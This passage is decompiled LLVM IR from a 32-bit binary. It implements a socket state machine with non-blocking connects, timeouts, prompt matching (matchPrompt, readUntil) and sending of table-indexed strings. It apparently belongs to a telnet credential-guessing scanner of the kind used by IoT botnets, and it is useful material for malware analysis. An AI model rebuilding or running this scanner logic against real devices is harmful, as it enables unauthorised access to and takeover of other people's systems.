  %v1_804a731 = icmp eq i1 %v12_804a72d, false
  br i1 %v1_804a731, label %dec_label_pc_804a8af, label %dec_label_pc_804a737

dec_label_pc_804a737:                             ; preds = %dec_label_pc_804a688
  store i32 4, i32* %stack_var_-184, align 4
  store i32 0, i32* %stack_var_-188, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a75a = load i32, i32* %v3_804a6b0, align 8
  store i32 %v4_804a75a, i32* %edx.global-to-local, align 4
  %v1_804a763 = load i32, i32* @esp, align 4
  %v2_804a763 = add i32 %v1_804a763, 16
  %v3_804a763 = inttoptr i32 %v2_804a763 to i32*
  store i32 %v2_804a75d, i32* %v3_804a763, align 4
  store i32 %v2_804a767, i32* %eax.global-to-local, align 4
  %v1_804a76d = load i32, i32* @esp, align 4
  %v2_804a76d = add i32 %v1_804a76d, 12
  %v3_804a76d = inttoptr i32 %v2_804a76d to i32*
  store i32 %v2_804a767, i32* %v3_804a76d, align 4
  %v0_804a771 = load i32, i32* @esp, align 4
  %v1_804a771 = add i32 %v0_804a771, 8
  %v2_804a771 = inttoptr i32 %v1_804a771 to i32*
  store i32 4, i32* %v2_804a771, align 4
  %v0_804a779 = load i32, i32* @esp, align 4
  %v1_804a779 = add i32 %v0_804a779, 4
  %v2_804a779 = inttoptr i32 %v1_804a779 to i32*
  store i32 1, i32* %v2_804a779, align 4
  %v0_804a781 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a781 = load i32, i32* @esp, align 4
  %v2_804a781 = inttoptr i32 %v1_804a781 to i32*
  store i32 %v0_804a781, i32* %v2_804a781, align 4
  %v0_804a784 = load i32, i32* %stack_var_-188, align 4
  %v1_804a784 = load i32, i32* %stack_var_-184, align 4
  %v2_804a784 = load i32, i32* %stack_var_-180, align 4
  %v4_804a784 = load i32, i32* %stack_var_-172, align 4
  %v5_804a784 = call i32 @getsockopt(i32 %v0_804a784, i32 %v1_804a784, i32 %v2_804a784, i32 10000, i32 %v4_804a784)
  %v3_804a789 = load i32, i32* %stack_var_-188, align 4
  %v1_804a78f = icmp eq i32 %v3_804a789, 0
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a7e9 = load i32, i32* %v3_804a6b0, align 8
  store i32 %v4_804a7e9, i32* %eax.global-to-local, align 4
  %v0_804a7ec = load i32, i32* @esp, align 4
  br i1 %v1_804a78f, label %dec_label_pc_804a7da, label %dec_label_pc_804a793

dec_label_pc_804a793:                             ; preds = %dec_label_pc_804a737
  %v2_804a7a5 = inttoptr i32 %v0_804a7ec to i32*
  store i32 %v4_804a7e9, i32* %v2_804a7a5, align 4
  %v0_804a7a8 = load i32, i32* %stack_var_-188, align 4
  %v1_804a7a8 = call i32 @sclose(i32 %v0_804a7a8)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804a7d0 = add i32 %v2_804a289, %v2_804a306
  %v4_804a7d0 = inttoptr i32 %v3_804a7d0 to i8*
  store i8 1, i8* %v4_804a7d0, align 1
  br label %dec_label_pc_804a8f7

dec_label_pc_804a7da:                             ; preds = %dec_label_pc_804a737
  %v1_804a7ec = add i32 %v0_804a7ec, 8
  %v2_804a7ec = inttoptr i32 %v1_804a7ec to i32*
  store i32 0, i32* %v2_804a7ec, align 4
  %v0_804a7f4 = load i32, i32* @esp, align 4
  %v1_804a7f4 = add i32 %v0_804a7f4, 4
  %v2_804a7f4 = inttoptr i32 %v1_804a7f4 to i32*
  store i32 3, i32* %v2_804a7f4, align 4
  %v0_804a7fc = load i32, i32* %eax.global-to-local, align 4
  %v1_804a7fc = load i32, i32* @esp, align 4
  %v2_804a7fc = inttoptr i32 %v1_804a7fc to i32*
  store i32 %v0_804a7fc, i32* %v2_804a7fc, align 4
  %v0_804a7ff = load i32, i32* %stack_var_-188, align 4
  %v1_804a7ff = load i32, i32* %stack_var_-184, align 4
  %v2_804a7ff = load i32, i32* %stack_var_-180, align 4
  %v3_804a7ff = call i32 @__libc_fcntl(i32 %v0_804a7ff, i32 %v1_804a7ff, i32 %v2_804a7ff)
  %v1_804a806 = and i32 %v3_804a7ff, -2049
  store i32 %v1_804a806, i32* @ebx, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a81b = load i32, i32* %v3_804a6b0, align 8
  store i32 %v4_804a81b, i32* %eax.global-to-local, align 4
  %v1_804a81e = load i32, i32* @esp, align 4
  %v2_804a81e = add i32 %v1_804a81e, 8
  %v3_804a81e = inttoptr i32 %v2_804a81e to i32*
  store i32 %v1_804a806, i32* %v3_804a81e, align 4
  %v0_804a822 = load i32, i32* @esp, align 4
  %v1_804a822 = add i32 %v0_804a822, 4
  %v2_804a822 = inttoptr i32 %v1_804a822 to i32*
  store i32 4, i32* %v2_804a822, align 4
  %v0_804a82a = load i32, i32* %eax.global-to-local, align 4
  %v1_804a82a = load i32, i32* @esp, align 4
  %v2_804a82a = inttoptr i32 %v1_804a82a to i32*
  store i32 %v0_804a82a, i32* %v2_804a82a, align 4
  %v0_804a82d = load i32, i32* %stack_var_-188, align 4
  %v1_804a82d = load i32, i32* %stack_var_-184, align 4
  %v2_804a82d = load i32, i32* %stack_var_-180, align 4
  %v3_804a82d = call i32 @__libc_fcntl(i32 %v0_804a82d, i32 %v1_804a82d, i32 %v2_804a82d)
  store i32 0, i32* %v1_804a65e, align 4
  %v1_804a85d = add i32 %v2_804a659, 16
  %v1_804a860 = inttoptr i32 %v1_804a85d to i16*
  store i16 0, i16* %v1_804a860, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  %v1_804a876 = add i32 %v2_804a659, 20
  store i32 %v1_804a876, i32* %eax.global-to-local, align 4
  %v1_804a879 = inttoptr i32 %v1_804a876 to i32*
  %v2_804a879 = load i32, i32* %v1_804a879, align 4
  store i32 %v2_804a879, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804a882 = load i32, i32* @esp, align 4
  %v2_804a882 = add i32 %v1_804a882, 8
  %v3_804a882 = inttoptr i32 %v2_804a882 to i32*
  store i32 1024, i32* %v3_804a882, align 4
  %v0_804a886 = load i32, i32* @esp, align 4
  %v1_804a886 = add i32 %v0_804a886, 4
  %v2_804a886 = inttoptr i32 %v1_804a886 to i32*
  store i32 0, i32* %v2_804a886, align 4
  %v0_804a88e = load i32, i32* %edx.global-to-local, align 4
  %v1_804a88e = load i32, i32* @esp, align 4
  %v2_804a88e = inttoptr i32 %v1_804a88e to i32*
  store i32 %v0_804a88e, i32* %v2_804a88e, align 4
  %v0_804a891 = load i32, i32* %stack_var_-188, align 4
  %v1_804a891 = load i32, i32* %stack_var_-184, align 4
  %v2_804a891 = load i32, i32* %stack_var_-180, align 4
  %v3_804a891 = inttoptr i32 %v0_804a891 to i8*
  %v4_804a891 = call i32 @__GI_memset(i8* %v3_804a891, i32 %v1_804a891, i32 %v2_804a891)
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  store i8 2, i8* %v4_804a309, align 8
  br label %dec_label_pc_804b759

dec_label_pc_804a8af:                             ; preds = %dec_label_pc_804a688
  %v13_804a8af = icmp eq i32 %v5_804a725, -1
  %v1_804a8b3 = icmp eq i1 %v13_804a8af, false
  br i1 %v1_804a8b3, label %dec_label_pc_804a8f7, label %dec_label_pc_804a8b5

dec_label_pc_804a8b5:                             ; preds = %dec_label_pc_804a8af
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a8c4 = load i32, i32* %v3_804a6b0, align 8
  store i32 %v4_804a8c4, i32* %eax.global-to-local, align 4
  %v1_804a8c7 = load i32, i32* @esp, align 4
  %v2_804a8c7 = inttoptr i32 %v1_804a8c7 to i32*
  store i32 %v4_804a8c4, i32* %v2_804a8c7, align 4
  %v1_804a8ca = call i32 @sclose(i32 %v5_804a725)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804a8f2 = add i32 %v2_804a289, %v2_804a306
  %v4_804a8f2 = inttoptr i32 %v3_804a8f2 to i8*
  store i8 1, i8* %v4_804a8f2, align 1
  br label %dec_label_pc_804a8f7

dec_label_pc_804a8f7:                             ; preds = %dec_label_pc_804a8af, %dec_label_pc_804a793, %dec_label_pc_804a8b5
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v1_804a65b, i32* %eax.global-to-local, align 4
  %v2_804a90b = load i32, i32* %v1_804a65e, align 4
  store i32 %v2_804a90b, i32* %eax.global-to-local, align 4
  %v1_804a90d = add i32 %v2_804a90b, 10
  store i32 %v1_804a90d, i32* @ebx, align 4
  %v0_804a910 = load i32, i32* @esp, align 4
  %v1_804a910 = inttoptr i32 %v0_804a910 to i32*
  store i32 0, i32* %v1_804a910, align 4
  %v0_804a917 = load i32, i32* %stack_var_-188, align 4
  %v1_804a917 = inttoptr i32 %v0_804a917 to i32*
  %v2_804a917 = call i32 @__GI_time(i32* %v1_804a917)
  store i32 %v2_804a917, i32* %eax.global-to-local, align 4
  %v0_804a91c = load i32, i32* @ebx, align 4
  %v7_804a91c = icmp ult i32 %v0_804a91c, %v2_804a917
  %v1_804a91e = icmp eq i1 %v7_804a91c, false
  br i1 %v1_804a91e, label %dec_label_pc_804b759, label %dec_label_pc_804a924

dec_label_pc_804a924:                             ; preds = %dec_label_pc_804a8f7
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a933 = load i32, i32* %v3_804a6b0, align 8
  store i32 %v4_804a933, i32* %eax.global-to-local, align 4
  %v1_804a936 = load i32, i32* @esp, align 4
  %v2_804a936 = inttoptr i32 %v1_804a936 to i32*
  store i32 %v4_804a933, i32* %v2_804a936, align 4
  %v0_804a939 = load i32, i32* %stack_var_-188, align 4
  %v1_804a939 = call i32 @sclose(i32 %v0_804a939)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804a961 = add i32 %v2_804a289, %v2_804a306
  %v4_804a961 = inttoptr i32 %v3_804a961 to i8*
  store i8 1, i8* %v4_804a961, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804a96b:                             ; preds = %dec_label_pc_804a2fa
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  %v2_804a97a = add i32 %v2_804a306, %v2_804a245
  %v1_804a97c = add i32 %v2_804a97a, 12
  store i32 %v1_804a97c, i32* %eax.global-to-local, align 4
  %v1_804a97f = inttoptr i32 %v1_804a97c to i32*
  %v2_804a97f = load i32, i32* %v1_804a97f, align 4
  store i32 %v2_804a97f, i32* %eax.global-to-local, align 4
  %v1_804a981 = icmp eq i32 %v2_804a97f, 0
  %v1_804a983 = icmp eq i1 %v1_804a981, false
  br i1 %v1_804a983, label %dec_label_pc_804a9a9, label %dec_label_pc_804a985

dec_label_pc_804a985:                             ; preds = %dec_label_pc_804a96b
  store i32 %v1_804a42569, i32* @ebx, align 4
  %v0_804a988 = load i32, i32* @esp, align 4
  %v1_804a988 = inttoptr i32 %v0_804a988 to i32*
  store i32 0, i32* %v1_804a988, align 4
  %v1_804a98f = inttoptr i32 %v6_804a309 to i32*
  %v2_804a98f = call i32 @__GI_time(i32* %v1_804a98f)
  store i32 %v2_804a245, i32* %edx.global-to-local, align 4
  %v0_804a999 = load i32, i32* @ebx, align 4
  %v2_804a99f = mul i32 %v0_804a999, 24
  %v2_804a9a2 = add i32 %v2_804a99f, %v2_804a245
  %v1_804a9a4 = add i32 %v2_804a9a2, 12
  store i32 %v1_804a9a4, i32* %eax.global-to-local, align 4
  %v2_804a9a7 = inttoptr i32 %v1_804a9a4 to i32*
  store i32 %v2_804a98f, i32* %v2_804a9a7, align 4
  br label %dec_label_pc_804a9a9

dec_label_pc_804a9a9:                             ; preds = %dec_label_pc_804a96b, %dec_label_pc_804a985
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  %v1_804a9ba = add i32 %v2_804a97a, 20
  store i32 %v1_804a9ba, i32* %eax.global-to-local, align 4
  %v1_804a9bd = inttoptr i32 %v1_804a9ba to i32*
  %v2_804a9bd = load i32, i32* %v1_804a9bd, align 4
  store i32 %v2_804a9bd, i32* %eax.global-to-local, align 4
  %v1_804a9bf = load i32, i32* @esp, align 4
  %v2_804a9bf = inttoptr i32 %v1_804a9bf to i32*
  store i32 %v2_804a9bd, i32* %v2_804a9bf, align 4
  %v0_804a9c2 = load i32, i32* %stack_var_-188, align 4
  %v1_804a9c2 = inttoptr i32 %v0_804a9c2 to i8*
  %v2_804a9c2 = call i32 @matchPrompt(i8* %v1_804a9c2)
  store i32 %v2_804a9c2, i32* %eax.global-to-local, align 4
  %v1_804a9c7 = icmp eq i32 %v2_804a9c2, 0
  br i1 %v1_804a9c7, label %dec_label_pc_804a9df, label %dec_label_pc_804a9cb

dec_label_pc_804a9cb:                             ; preds = %dec_label_pc_804a9a9
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  store i8 8, i8* %v4_804a309, align 8
  br label %dec_label_pc_804a9df

dec_label_pc_804a9df:                             ; preds = %dec_label_pc_804a9a9, %dec_label_pc_804a9cb
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  %v1_804a9f0 = add i32 %v2_804a97a, 16
  store i32 %v1_804a9f0, i32* %eax.global-to-local, align 4
  %v1_804a9f3 = inttoptr i32 %v1_804a9f0 to i16*
  %v2_804a9f3 = load i16, i16* %v1_804a9f3, align 8
  %v3_804a9f3 = zext i16 %v2_804a9f3 to i32
  store i32 %v3_804a9f3, i32* @esi, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v1_804a9ba, i32* %eax.global-to-local, align 4
  %v2_804aa0c = load i32, i32* %v1_804a9bd, align 4
  store i32 %v2_804aa0c, i32* @ebx, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804aa1d = inttoptr i32 %v2_804a97a to i32*
  %v4_804aa1d = load i32, i32* %v3_804aa1d, align 8
  store i32 %v4_804aa1d, i32* %eax.global-to-local, align 4
  %v1_804aa20 = load i32, i32* @esp, align 4
  %v2_804aa20 = add i32 %v1_804aa20, 28
  %v3_804aa20 = inttoptr i32 %v2_804aa20 to i32*
  store i32 %v3_804a9f3, i32* %v3_804aa20, align 4
  %v0_804aa24 = load i32, i32* @esp, align 4
  %v1_804aa24 = add i32 %v0_804aa24, 24
  %v2_804aa24 = inttoptr i32 %v1_804aa24 to i32*
  store i32 1024, i32* %v2_804aa24, align 4
  %v0_804aa2c = load i32, i32* @ebx, align 4
  %v1_804aa2c = load i32, i32* @esp, align 4
  %v2_804aa2c = add i32 %v1_804aa2c, 20
  %v3_804aa2c = inttoptr i32 %v2_804aa2c to i32*
  store i32 %v0_804aa2c, i32* %v3_804aa2c, align 4
  %v0_804aa30 = load i32, i32* @esp, align 4
  %v1_804aa30 = add i32 %v0_804aa30, 16
  %v2_804aa30 = inttoptr i32 %v1_804aa30 to i32*
  store i32 10000, i32* %v2_804aa30, align 4
  %v0_804aa38 = load i32, i32* @esp, align 4
  %v1_804aa38 = add i32 %v0_804aa38, 12
  %v2_804aa38 = inttoptr i32 %v1_804aa38 to i32*
  store i32 0, i32* %v2_804aa38, align 4
  %v0_804aa40 = load i32, i32* @esp, align 4
  %v1_804aa40 = add i32 %v0_804aa40, 8
  %v2_804aa40 = inttoptr i32 %v1_804aa40 to i32*
  store i32 0, i32* %v2_804aa40, align 4
  %v0_804aa48 = load i32, i32* @esp, align 4
  %v1_804aa48 = add i32 %v0_804aa48, 4
  %v2_804aa48 = inttoptr i32 %v1_804aa48 to i32*
  store i32 ptrtoint ([6 x i8]* @global_var_8052e6f.34 to i32), i32* %v2_804aa48, align 4
  %v0_804aa50 = load i32, i32* %eax.global-to-local, align 4
  %v1_804aa50 = load i32, i32* @esp, align 4
  %v2_804aa50 = inttoptr i32 %v1_804aa50 to i32*
  store i32 %v0_804aa50, i32* %v2_804aa50, align 4
  %v0_804aa53 = call i32 @readUntil()
  store i32 %v0_804aa53, i32* %eax.global-to-local, align 4
  %v1_804aa58 = icmp eq i32 %v0_804aa53, 0
  br i1 %v1_804aa58, label %dec_label_pc_804aad9, label %dec_label_pc_804aa5c

dec_label_pc_804aa5c:                             ; preds = %dec_label_pc_804a9df
  store i32 0, i32* %v1_804a97f, align 4
  store i16 0, i16* %v1_804a9f3, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v1_804a9ba, i32* %eax.global-to-local, align 4
  %v2_804aaa3 = load i32, i32* %v1_804a9bd, align 4
  store i32 %v2_804aaa3, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804aaac = load i32, i32* @esp, align 4
  %v2_804aaac = add i32 %v1_804aaac, 8
  %v3_804aaac = inttoptr i32 %v2_804aaac to i32*
  store i32 1024, i32* %v3_804aaac, align 4
  %v0_804aab0 = load i32, i32* @esp, align 4
  %v1_804aab0 = add i32 %v0_804aab0, 4
  %v2_804aab0 = inttoptr i32 %v1_804aab0 to i32*
  store i32 0, i32* %v2_804aab0, align 4
  %v0_804aab8 = load i32, i32* %edx.global-to-local, align 4
  %v1_804aab8 = load i32, i32* @esp, align 4
  %v2_804aab8 = inttoptr i32 %v1_804aab8 to i32*
  store i32 %v0_804aab8, i32* %v2_804aab8, align 4
  %v0_804aabb = load i32, i32* %stack_var_-188, align 4
  %v1_804aabb = load i32, i32* %stack_var_-184, align 4
  %v2_804aabb = load i32, i32* %stack_var_-180, align 4
  %v3_804aabb = inttoptr i32 %v0_804aabb to i8*
  %v4_804aabb = call i32 @__GI_memset(i8* %v3_804aabb, i32 %v1_804aabb, i32 %v2_804aabb)
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  store i8 3, i8* %v4_804a309, align 8
  br label %dec_label_pc_804b759

dec_label_pc_804aad9:                             ; preds = %dec_label_pc_804a9df
  store i32 %v1_804a42569, i32* %ebx.global-to-local, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v1_804a9ba, i32* %eax.global-to-local, align 4
  %v2_804aaf0 = load i32, i32* %v1_804a9bd, align 4
  %v1_804aafd = and i32 %v2_804aaf0, -256
  store i32 %v1_804aafd, i32* %eax.global-to-local, align 4
  %v4_804ab00 = inttoptr i32 %v2_804aaf0 to i8*
  store i32 %v2_804aaf0, i32* @edi, align 4
  %v3_804ab06 = call i32 @_strlen(i8* %v4_804ab00)
  %v0_804ab13 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ab19 = mul i32 %v0_804ab13, 24
  %v1_804ab1e = add i32 %v2_804ab1c, %v2_804ab19
  %v1_804ab21 = trunc i32 %v3_804ab06 to i16
  %v3_804ab21 = inttoptr i32 %v1_804ab1e to i16*
  store i16 %v1_804ab21, i16* %v3_804ab21, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v1_804a97c, i32* %eax.global-to-local, align 4
  %v2_804ab38 = load i32, i32* %v1_804a97f, align 4
  store i32 %v2_804ab38, i32* %eax.global-to-local, align 4
  %v1_804ab3a = add i32 %v2_804ab38, 30
  store i32 %v1_804ab3a, i32* @ebx, align 4
  %v0_804ab3d = load i32, i32* @esp, align 4
  %v1_804ab3d = inttoptr i32 %v0_804ab3d to i32*
  store i32 0, i32* %v1_804ab3d, align 4
  %v1_804ab44 = inttoptr i32 %v2_804aaf0 to i32*
  %v2_804ab44 = call i32 @__GI_time(i32* %v1_804ab44)
  store i32 %v2_804ab44, i32* %eax.global-to-local, align 4
  %v0_804ab49 = load i32, i32* @ebx, align 4
  %v7_804ab49 = icmp ult i32 %v0_804ab49, %v2_804ab44
  %v1_804ab4b = icmp eq i1 %v7_804ab49, false
  br i1 %v1_804ab4b, label %dec_label_pc_804b759, label %dec_label_pc_804ab51

dec_label_pc_804ab51:                             ; preds = %dec_label_pc_804aad9
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804ab60 = load i32, i32* %v3_804aa1d, align 8
  store i32 %v4_804ab60, i32* %eax.global-to-local, align 4
  %v1_804ab63 = load i32, i32* @esp, align 4
  %v2_804ab63 = inttoptr i32 %v1_804ab63 to i32*
  store i32 %v4_804ab60, i32* %v2_804ab63, align 4
  %v1_804ab66 = call i32 @sclose(i32 %v2_804aaf0)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804ab8e = add i32 %v2_804a289, %v2_804a306
  %v4_804ab8e = inttoptr i32 %v3_804ab8e to i8*
  store i8 1, i8* %v4_804ab8e, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804ab98:                             ; preds = %dec_label_pc_804a2fa
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804aba7 = add i32 %.pre, %v2_804a306
  %v4_804aba7 = inttoptr i32 %v3_804aba7 to i8*
  %v5_804aba7 = load i8, i8* %v4_804aba7, align 2
  %v6_804aba7 = zext i8 %v5_804aba7 to i32
  store i32 %v6_804aba7, i32* %eax.global-to-local, align 4
  %v1_804abaf = mul nuw nsw i32 %v6_804aba7, 4
  %v2_804abaf = add nuw nsw i32 %v1_804abaf, 134567464
  %v3_804abaf = inttoptr i32 %v2_804abaf to i32*
  %v4_804abaf = load i32, i32* %v3_804abaf, align 4
  %v1_804abc1 = and i32 %v4_804abaf, -256
  store i32 %v1_804abc1, i32* %eax.global-to-local, align 4
  %v4_804abc4 = inttoptr i32 %v4_804abaf to i8*
  store i32 %v4_804abaf, i32* @edi, align 4
  %v3_804abca = call i32 @_strlen(i8* %v4_804abc4)
  store i32 %v3_804abca, i32* @esi, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v5_804abe2 = load i8, i8* %v4_804aba7, align 2
  %v6_804abe2 = zext i8 %v5_804abe2 to i32
  store i32 %v6_804abe2, i32* %eax.global-to-local, align 4
  %v1_804abea = mul nuw nsw i32 %v6_804abe2, 4
  %v2_804abea = add nuw nsw i32 %v1_804abea, 134567464
  %v3_804abea = inttoptr i32 %v2_804abea to i32*
  %v4_804abea = load i32, i32* %v3_804abea, align 4
  store i32 %v4_804abea, i32* @ebx, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v2_804ac00 = add i32 %v2_804a306, %v2_804a245
  %v3_804ac00 = inttoptr i32 %v2_804ac00 to i32*
  %v4_804ac00 = load i32, i32* %v3_804ac00, align 8
  store i32 %v4_804ac00, i32* %eax.global-to-local, align 4
  %v0_804ac03 = load i32, i32* @esp, align 4
  %v1_804ac03 = add i32 %v0_804ac03, 12
  %v2_804ac03 = inttoptr i32 %v1_804ac03 to i32*
  store i32 16384, i32* %v2_804ac03, align 4
  %v0_804ac0b = load i32, i32* @esi, align 4
  %v1_804ac0b = load i32, i32* @esp, align 4
  %v2_804ac0b = add i32 %v1_804ac0b, 8
  %v3_804ac0b = inttoptr i32 %v2_804ac0b to i32*
  store i32 %v0_804ac0b, i32* %v3_804ac0b, align 4
  %v0_804ac0f = load i32, i32* @ebx, align 4
  %v1_804ac0f = load i32, i32* @esp, align 4
  %v2_804ac0f = add i32 %v1_804ac0f, 4
  %v3_804ac0f = inttoptr i32 %v2_804ac0f to i32*
  store i32 %v0_804ac0f, i32* %v3_804ac0f, align 4
  %v0_804ac13 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ac13 = load i32, i32* @esp, align 4
  %v2_804ac13 = inttoptr i32 %v1_804ac13 to i32*
  store i32 %v0_804ac13, i32* %v2_804ac13, align 4
  %v4_804ac16 = call i32 @__libc_send(i32 %v4_804abaf, i32 %stack_var_-224.253, i32 %.v2_804a1b4, i32 %v2_804a245)
  %v2_804ac1b = icmp slt i32 %v4_804ac16, 0
  %v1_804ac1d = icmp eq i1 %v2_804ac1b, false
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804ac75 = load i32, i32* %v3_804ac00, align 8
  store i32 %v4_804ac75, i32* %eax.global-to-local, align 4
  %v0_804ac78 = load i32, i32* @esp, align 4
  br i1 %v1_804ac1d, label %dec_label_pc_804ac66, label %dec_label_pc_804ac1f

dec_label_pc_804ac1f:                             ; preds = %dec_label_pc_804ab98
  %v2_804ac31 = inttoptr i32 %v0_804ac78 to i32*
  store i32 %v4_804ac75, i32* %v2_804ac31, align 4
  %v1_804ac34 = call i32 @sclose(i32 %v4_804abaf)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804ac5c = add i32 %v2_804a289, %v2_804a306
  %v4_804ac5c = inttoptr i32 %v3_804ac5c to i8*
  store i8 1, i8* %v4_804ac5c, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804ac66:                             ; preds = %dec_label_pc_804ab98
  %v1_804ac78 = add i32 %v0_804ac78, 12
  %v2_804ac78 = inttoptr i32 %v1_804ac78 to i32*
  store i32 16384, i32* %v2_804ac78, align 4
  %v0_804ac80 = load i32, i32* @esp, align 4
  %v1_804ac80 = add i32 %v0_804ac80, 8
  %v2_804ac80 = inttoptr i32 %v1_804ac80 to i32*
  store i32 2, i32* %v2_804ac80, align 4
  %v0_804ac88 = load i32, i32* @esp, align 4
  %v1_804ac88 = add i32 %v0_804ac88, 4
  %v2_804ac88 = inttoptr i32 %v1_804ac88 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052e75.35 to i32), i32* %v2_804ac88, align 4
  %v0_804ac90 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ac90 = load i32, i32* @esp, align 4
  %v2_804ac90 = inttoptr i32 %v1_804ac90 to i32*
  store i32 %v0_804ac90, i32* %v2_804ac90, align 4
  %v4_804ac93 = call i32 @__libc_send(i32 %v4_804abaf, i32 %stack_var_-224.253, i32 %.v2_804a1b4, i32 %v2_804a245)
  %v2_804ac98 = icmp slt i32 %v4_804ac93, 0
  %v1_804ac9a = icmp eq i1 %v2_804ac98, false
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  br i1 %v1_804ac9a, label %dec_label_pc_804ace3, label %dec_label_pc_804ac9c

dec_label_pc_804ac9c:                             ; preds = %dec_label_pc_804ac66
  %v4_804acab = load i32, i32* %v3_804ac00, align 8
  store i32 %v4_804acab, i32* %eax.global-to-local, align 4
  %v1_804acae = load i32, i32* @esp, align 4
  %v2_804acae = inttoptr i32 %v1_804acae to i32*
  store i32 %v4_804acab, i32* %v2_804acae, align 4
  %v1_804acb1 = call i32 @sclose(i32 %v4_804abaf)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804acd9 = add i32 %v2_804a289, %v2_804a306
  %v4_804acd9 = inttoptr i32 %v3_804acd9 to i8*
  store i8 1, i8* %v4_804acd9, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804ace3:                             ; preds = %dec_label_pc_804ac66
  store i8 4, i8* %v4_804a309, align 8
  br label %dec_label_pc_804b759

dec_label_pc_804acfc:                             ; preds = %dec_label_pc_804a2fa
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  %v2_804ad0b = add i32 %v2_804a306, %v2_804a245
  %v1_804ad0d = add i32 %v2_804ad0b, 12
  store i32 %v1_804ad0d, i32* %eax.global-to-local, align 4
  %v1_804ad10 = inttoptr i32 %v1_804ad0d to i32*
  %v2_804ad10 = load i32, i32* %v1_804ad10, align 4
  store i32 %v2_804ad10, i32* %eax.global-to-local, align 4
  %v1_804ad12 = icmp eq i32 %v2_804ad10, 0
  %v1_804ad14 = icmp eq i1 %v1_804ad12, false
  br i1 %v1_804ad14, label %dec_label_pc_804ad3a, label %dec_label_pc_804ad16

dec_label_pc_804ad16:                             ; preds = %dec_label_pc_804acfc
  store i32 %v1_804a42569, i32* @ebx, align 4
  %v0_804ad19 = load i32, i32* @esp, align 4
  %v1_804ad19 = inttoptr i32 %v0_804ad19 to i32*
  store i32 0, i32* %v1_804ad19, align 4
  %v1_804ad20 = inttoptr i32 %v6_804a309 to i32*
  %v2_804ad20 = call i32 @__GI_time(i32* %v1_804ad20)
  store i32 %v2_804a245, i32* %edx.global-to-local, align 4
  %v0_804ad2a = load i32, i32* @ebx, align 4
  %v2_804ad30 = mul i32 %v0_804ad2a, 24
  %v2_804ad33 = add i32 %v2_804ad30, %v2_804a245
  %v1_804ad35 = add i32 %v2_804ad33, 12
  store i32 %v1_804ad35, i32* %eax.global-to-local, align 4
